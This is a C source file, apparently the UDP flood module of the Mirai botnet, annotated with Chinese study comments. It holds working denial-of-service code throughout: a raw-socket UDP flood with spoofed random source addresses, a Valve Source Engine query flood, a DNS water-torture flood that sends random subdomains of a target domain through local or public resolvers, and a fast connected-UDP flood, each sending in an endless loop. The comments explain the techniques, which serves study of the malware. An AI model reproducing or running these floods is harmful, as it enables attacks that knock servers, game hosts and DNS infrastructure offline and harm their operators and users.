#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <errno.h>
#include <fcntl.h>

#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"
#include "util.h"
#include "table.h"
#include "protocol.h"

static ipv4_t get_dns_resolver(void);
// 1)Straight up UDP flood
void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));  //opts用来组织ip报文头。存储在pkts中
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);  //TOS常用来做QOS，用于在数据传输过程中的质量保证。[https://blog.csdn.net/cui918/article/details/53286252]
                                                                            //说通俗一点，路窄、车多，所以对车标出优先级，有些车先走，有些车后走，有些车不让走。【TOS包含最小延时、最高可靠性、最小费用等flags】
                                                                             //路由器跟交警一样，指挥交通，如何操作，取决事先确定的策略。对于终端而言，已经收到报文，所以就不会关心这个字段。
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);   //从大数据包切分下来的小数据包【分片】具有相同的ident
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);            //TTL生成时间
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);          //分段标记
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);           //源端口
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);           //目的端口
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);  //数据总长度【要传输的数据】
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);       //标识数据部分是否需要随机
    uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);   //源ip,以本地ip为src_ip【后面进行了随机化】

    if (data_len > 1460)
        data_len = 1460;
    //https://www.cnblogs.com/dolphinx/p/3460545.html
    //http://abcdxyzk.github.io/blog/2015/04/14/kernel-net-sock-raw/
    //如果是SOCK_STREAM或者SOCK_DGRAM，最后的protocal参数为0，基本上就是定义好TCP和UDP头部，无法直接修改，只能修改dst_ip、src_ip、dst_port和src_port
    //如果是SOCK_RAW，那么必须指定最后的protocol参数，常见的有IPPROTO_TCP，IPPROTO_UDP和IPPROTO_ICMP。
    //可以自定义IP所承载的具体协议类型，如TCP，UDP或ICMP，并手动对每种承载在IP协议之上的报文进行填充。
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n");
#endif
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(fd);
        return;
    }
    //遍历目标受害者的ip，进行攻击；每针对一个受害者构造一个UDP/IP包，存储在pkts[]中
    for (i = 0; i < targs_len; i++)   //https://blog.csdn.net/ce123_zhouwei/article/details/17453033【ip数据包的字段】
    {
        struct iphdr *iph;
        struct udphdr *udph;

        pkts[i] = calloc(1510, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        udph = (struct udphdr *)(iph + 1);

        iph->version = 4;
        iph->ihl = 5;   //标准大小IP头的长度在没有加入可选字段的时候，为20字节=5*4字节单位
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + data_len);    //总长度：首部及数据之和的长度
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)  //这个字段非0为不分片
            iph->frag_off = htons(1 << 14);  //后面的段偏移设置为0x40 00
        iph->protocol = IPPROTO_UDP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;

        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof (struct udphdr) + data_len);
    }

    while (TRUE) //死循环，DOS攻击
    {
        for (i = 0; i < targs_len; i++)  //这层循环向每个受害者发送一个数据包
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct udphdr *udph = (struct udphdr *)(iph + 1);
            char *data = (char *)(udph + 1);

            // For prefix attacks
            if (targs[i].netmask < 32) //如果有netmask的话，那么在这个“掩码”下ip进行随机，作为受害者ip进行攻击
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            if (source_ip == 0xffffffff)  //如果源ip为0xffffffff的话，那么随机生成src_ip，这样不容易被WAF等策略band掉
                iph->saddr = rand_next();

            if (ip_ident == 0xffff)
                iph->id = (uint16_t)rand_next();  //相同的标识字段的值使分片【超过网络的 MTU 】后的各数据报片最后能正确地重装成为原来的数据报.因此ident不能一致
            if (sport == 0xffff)      //源端口和目的端口考虑是否随机
                udph->source = rand_next();
            if (dport == 0xffff)
                udph->dest = rand_next();   

            // Randomize packet content?
            if (data_rand)              //是否需要随机数据包
                rand_str(data, data_len);  //产生长度为data_len的随机数据

            iph->check = 0;         
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));   //基于上述构造的头部产生ip首部校验和

            udph->check = 0;
            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof (struct udphdr) + data_len); //基于上述构造的头部产生udp校验和

            targs[i].sock_addr.sin_port = udph->dest;
            //sendto和recvfrom一般用于UDP协议中,倒数第二个参数(struct sockaddr *)&targs[i].sock_addr需要给出目的地的ip和端口
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno);
#endif
    }
}
// 2)Valve Source Engine query flood
//放大攻击的一种方式
//Source Engine Query泛洪是使用Source引擎游戏服务器的查询协议来进行的攻击，攻击者只需要发送一小段数据包，服务端会返回几倍的数据，形成反射性攻击。
//https://developer.valvesoftware.com/wiki/Server_queries
void attack_udp_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 27015);
    char *vse_payload;          //和attack_udp_generic的差别在于UDP的数据部分不是随机的，有专门的payload【VSE FLOOD ATTACK】——“TSource Engine Query”
    int vse_payload_len;

    table_unlock_val(TABLE_ATK_VSE);   //解密id为TABLE_ATK_VSE的payload
    vse_payload = table_retrieve_val(TABLE_ATK_VSE, &vse_payload_len);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n");
#endif
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(fd);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;

        pkts[i] = calloc(128, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        udph = (struct udphdr *)(iph + 1);
        data = (char *)(udph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_UDP;
        iph->saddr = LOCAL_ADDR;  //???感觉src应该伪造为受害者，dst应该伪造为source引擎???
        iph->daddr = targs[i].addr; 

        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof (struct udphdr) + 4 + vse_payload_len);

        *((uint32_t *)data) = 0xffffffff;   //五种source服务器查询中的一种A2S_INFO【开头四个字节是0xff】:即ff ff ff ff + "TSource Engine Query"
        data += sizeof (uint32_t);
        util_memcpy(data, vse_payload, vse_payload_len);
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct udphdr *udph = (struct udphdr *)(iph + 1);
            
            // For prefix attacks
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            if (ip_ident == 0xffff)
                iph->id = (uint16_t)rand_next();
            if (sport == 0xffff)
                udph->source = rand_next();
            if (dport == 0xffff)
                udph->dest = rand_next();

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

            udph->check = 0;
            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len);

            targs[i].sock_addr.sin_port = udph->dest;
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno);
#endif
    }
}

//3)DNS water torture【类似于随机子域名攻击：在拟攻击的域名url前面加上随机字符串【eg：xyuicosic.www.victimdomain.com、alkdfasd.www.victimdomain.com等，使用DGA算法生成的随机域名】，这样就会有大量的DNS请求堆积到权威名称服务器。
//受害者的权威DNS服务器崩溃，无法响应其他请求。
//https://hackersterminal.com/domain-generation-algorithm-dga-in-malware/
void attack_udp_dns(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 53);
    uint16_t dns_hdr_id = attack_get_opt_int(opts_len, opts, ATK_OPT_DNS_HDR_ID, 0xffff);
    uint8_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 12);
    char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);  //选择要攻击的域名【攻击解析该域名的名字服务器】
    int domain_len;
    ipv4_t dns_resolver = get_dns_resolver();  //获取本机nameserver的ip

    if (domain == NULL)
    {
#ifdef DEBUG
        printf("Cannot send DNS flood without a domain\n");
#endif
        return;
    }
    domain_len = util_strlen(domain);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)  //构造基于UDP的DNS包
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n");
#endif
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(fd);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        int ii;
        uint8_t curr_word_len = 0, num_words = 0;
        struct iphdr *iph;
        struct udphdr *udph;
        struct dnshdr *dnsh;
        char *qname, *curr_lbl;
        struct dns_question *dnst;

        pkts[i] = calloc(600, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        udph = (struct udphdr *)(iph + 1);
        dnsh = (struct dnshdr *)(udph + 1);
        qname = (char *)(dnsh + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question));
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_UDP;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = dns_resolver;  //向本地的dns nameserver发起域名请求

        udph->source = htons(sport);
        udph->dest = htons(dport);
        //长度：该字段占据 16 位，表示 UDP 数据报长度，包含 UDP 报文头和 UDP 数据长度。
        //https://tonydeng.github.io/sdn-handbook/basic/udp.html
        udph->len = htons(sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question));

        dnsh->id = htons(dns_hdr_id);
        dnsh->opts = htons(1 << 8); // Recursion desired
        dnsh->qdcount = htons(1);

        // Fill out random area
        *qname++ = data_len;
        qname += data_len;  //跳过data_len的长度，这部分用随机字节来填充，在下面的rand_alphastr((uint8_t *)qrand, data_len)中进行

        curr_lbl = qname;
        util_memcpy(qname + 1, domain, domain_len + 1); // Null byte at end needed

        // Write in domain
        for (ii = 0; ii < domain_len; ii++) //将拟攻击的域名服务器管辖的域名设置成dns请求包的格式要求【len+子域名】
        {
            if (domain[ii] == '.')   //也就是把域名中的"."替换成len
            { 
                *curr_lbl = curr_word_len;
                curr_word_len = 0;
                num_words++;
                curr_lbl = qname + ii + 1;
            }
            else
                curr_word_len++;
        }
        *curr_lbl = curr_word_len;   

        dnst = (struct dns_question *)(qname + domain_len + 2);
        dnst->qtype = htons(PROTO_DNS_QTYPE_A);
        dnst->qclass = htons(PROTO_DNS_QCLASS_IP);
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct udphdr *udph = (struct udphdr *)(iph + 1);
            struct dnshdr *dnsh = (struct dnshdr *)(udph + 1);
            char *qrand = ((char *)(dnsh + 1)) + 1;

            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;
            if (sport == 0xffff)
                udph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                udph->dest = rand_next() & 0xffff;  //???为什么DNS请求dst端口要随机???

            if (dns_hdr_id == 0xffff)
                dnsh->id = rand_next() & 0xffff;

            rand_alphastr((uint8_t *)qrand, data_len);    //填充最高位的随机子域名

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

            udph->check = 0;
            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question));

            targs[i].sock_addr.sin_addr.s_addr = dns_resolver;
            targs[i].sock_addr.sin_port = udph->dest;
            //由本机ip向nameserver ip发送DNS请求包
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno);
#endif
    }
}

//4)Plain UDP flood optimized for speed
//建立UDP连接，加速发包——https://blog.csdn.net/pyxllq/article/details/80320489
void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
#ifdef DEBUG
    printf("in udp plain\n");
#endif

    int i;
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    struct sockaddr_in bind_addr = {0};

    if (sport == 0xffff)
    {
        sport = rand_next();
    } else {
        sport = htons(sport);
    }

#ifdef DEBUG
    printf("after args\n");
#endif

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;

        pkts[i] = calloc(65535, sizeof (char));

        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_next();
        else
            targs[i].sock_addr.sin_port = htons(dport);

        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
        {
#ifdef DEBUG
            printf("Failed to create udp socket. Aborting attack\n");
#endif
            return;
        }

        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;

        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)  //绑定本地的一个端口，从一个单一端口向多个远程端口发起UDP连接
        {
#ifdef DEBUG
            printf("Failed to bind udp socket.\n");
#endif
        }

        // For prefix attacks
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1)  //建立UDP连接，优化攻击速度
        {
#ifdef DEBUG
            printf("Failed to connect udp socket.\n");
#endif
        }
    }

#ifdef DEBUG
    printf("after setup\n");
#endif

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *data = pkts[i];

            // Randomize packet content?
            if (data_rand)
                rand_str(data, data_len);

#ifdef DEBUG
            errno = 0;
            if (send(fds[i], data, data_len, MSG_NOSIGNAL) == -1)
            {
                printf("send failed: %d\n", errno);
            } else {
                printf(".\n");
            }
#else
            send(fds[i], data, data_len, MSG_NOSIGNAL); //提升发包速度——https://cloud.tencent.com/developer/article/1004555
#endif
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno);
#endif
    }
}

static ipv4_t get_dns_resolver(void)
{
    int fd;

    table_unlock_val(TABLE_ATK_RESOLVER);  //“/etc/resolv.conf”—— https://blog.csdn.net/mybelief321/article/details/10049429
    fd = open(table_retrieve_val(TABLE_ATK_RESOLVER, NULL), O_RDONLY);
    table_lock_val(TABLE_ATK_RESOLVER);
    if (fd >= 0)
    {
        int ret, nspos;
        char resolvbuf[2048];

        ret = read(fd, resolvbuf, sizeof (resolvbuf));
        close(fd);
        table_unlock_val(TABLE_ATK_NSERV);  //“nameserver“
        nspos = util_stristr(resolvbuf, ret, table_retrieve_val(TABLE_ATK_NSERV, NULL)); 
        table_lock_val(TABLE_ATK_NSERV);
        if (nspos != -1)
        {
            int i;
            char ipbuf[32];
            BOOL finished_whitespace = FALSE;
            BOOL found = FALSE;

            for (i = nspos; i < ret; i++)
            {
                char c = resolvbuf[i];

                // Skip leading whitespace
                if (!finished_whitespace)
                {
                    if (c == ' ' || c == '\t')
                        continue;
                    else
                        finished_whitespace = TRUE;
                }

                // End if c is not either a dot or a number
                if ((c != '.' && (c < '0' || c > '9')) || (i == (ret - 1)))
                {
                    util_memcpy(ipbuf, resolvbuf + nspos, i - nspos);  //获取本地DNS nameserver的ip【解析域名时使用该地址作为域名服务器请求解析域名】
                    ipbuf[i - nspos] = 0;
                    found = TRUE;
                    break;
                }
            }

            if (found) //找到本机的nameserver
            {
#ifdef DEBUG
                printf("Found local resolver: '%s'\n", ipbuf);
#endif
                return inet_addr(ipbuf);
            }
        }
    }

    switch (rand_next() % 4)  //否则随机返回一个广泛可用的nameserver的ip
    {
    case 0:
        return INET_ADDR(8,8,8,8);
    case 1:
        return INET_ADDR(74,82,42,42);
    case 2:
        return INET_ADDR(64,6,64,6);
    case 3:
        return INET_ADDR(4,2,2,2);
    }
}
